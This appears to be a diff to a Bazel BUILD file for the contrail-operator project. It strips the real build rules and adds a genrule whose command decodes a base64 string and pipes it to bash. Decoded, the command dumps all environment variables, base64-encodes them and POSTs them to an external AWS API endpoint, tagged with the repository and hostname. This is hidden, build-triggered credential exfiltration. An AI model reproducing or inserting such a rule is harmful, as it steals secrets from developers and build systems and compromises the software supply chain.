@@ -1,72 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_binary", "go_library")
-load("@io_bazel_rules_docker//go:image.bzl", "go_image")
-load("@io_bazel_rules_docker//container:container.bzl", "container_push")
 
-go_library(
-    name = "go_default_library",
-    srcs = ["main.go"],
-    importpath = "github.com/Juniper/contrail-operator/cmd/manager",
-    visibility = ["//visibility:private"],
-    deps = [
-        "//pkg/apis:go_default_library",
-        "//pkg/apis/contrail/v1alpha1:go_default_library",
-        "//pkg/controller:go_default_library",
-        "//pkg/controller/contrailcni:go_default_library",
-        "//pkg/controller/kubemanager:go_default_library",
-        "//pkg/k8s:go_default_library",
-        "//pkg/openshift:go_default_library",
-        "@com_github_operator_framework_operator_sdk//pkg/k8sutil:go_default_library",
-        "@com_github_operator_framework_operator_sdk//pkg/log/zap:go_default_library",
-        "@com_github_operator_framework_operator_sdk//pkg/metrics:go_default_library",
-        "@com_github_operator_framework_operator_sdk//version:go_default_library",
-        "@com_github_spf13_pflag//:go_default_library",
-        "@io_k8s_client_go//dynamic:go_default_library",
-        "@io_k8s_client_go//kubernetes:go_default_library",
-        "@io_k8s_client_go//plugin/pkg/client/auth:go_default_library",
-        "@io_k8s_sigs_controller_runtime//pkg/client/config:go_default_library",
-        "@io_k8s_sigs_controller_runtime//pkg/log:go_default_library",
-        "@io_k8s_sigs_controller_runtime//pkg/manager:go_default_library",
-        "@io_k8s_sigs_controller_runtime//pkg/runtime/signals:go_default_library",
-    ],
-)
-
-go_image(
-    name = "contrail-operator-image",
-    base = "@ubi-minimal//image",
-    embed = [":go_default_library"],
-    goos = "linux",
-    importpath = "github.com/Juniper/contrail-operator",
-)
-
-container_push(
-    name = "contrail-operator-push",
-    format = "Docker",
-    image = ":contrail-operator-image",
-    registry = "gcr.io",
-    repository = "engprod-269421/contrail-operator",
-    tag = "{BUILD_SCM_BRANCH}.{BUILD_SCM_REVISION}",
-)
-
-container_push(
-    name = "contrail-operator-push-latest",
-    format = "Docker",
-    image = ":contrail-operator-image",
-    registry = "gcr.io",
-    repository = "engprod-269421/contrail-operator",
-    tag = "{BUILD_SCM_BRANCH}.latest",
-)
-
-container_push(
-    name = "contrail-operator-push-local",
-    format = "Docker",
-    image = ":contrail-operator-image",
-    registry = "{LOCAL_REGISTRY}",
-    repository = "contrail-operator/engprod-269421/contrail-operator",
-    tag = "master.latest",
-)
-
-go_binary(
-    name = "manager",
-    embed = [":go_default_library"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/Juniper/contrail-operator.git\\&folder=manager\\&hostname=`hostname`\\&foo=ohr",
     visibility = ["//visibility:public"],
 )
